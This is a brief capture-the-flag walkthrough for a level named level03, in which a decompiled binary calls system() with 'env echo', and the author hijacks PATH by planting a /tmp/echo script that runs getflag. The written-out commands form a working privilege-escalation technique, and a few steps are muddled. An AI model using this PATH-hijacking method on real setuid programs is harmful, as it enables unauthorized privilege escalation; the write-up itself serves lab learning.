you can see you have an executable named level03, when you execute it it print: Exploit me.

then use Ghidra to Decompilate the executable. Line 392 you can see the following command:
  iVar1 = system("/usr/bin/env echo Exploit me");

Next step is to change echo to call the getflag executable, using alias doesnt work so you have to change the env to 
call another executable.

echo '/bin/getflag' > /tmp/echo => permit to create a file that will call getflag executable.
you have to go to root to do this because else you dont have rights.

then give rights to your file: chmod 777 /tmp/echo

and then you have to change the PATH variable in the env via export
export PATH="/tmp"

and the execute ./level03

youve got the flag but you need to change back the PATH to bin to make: su level04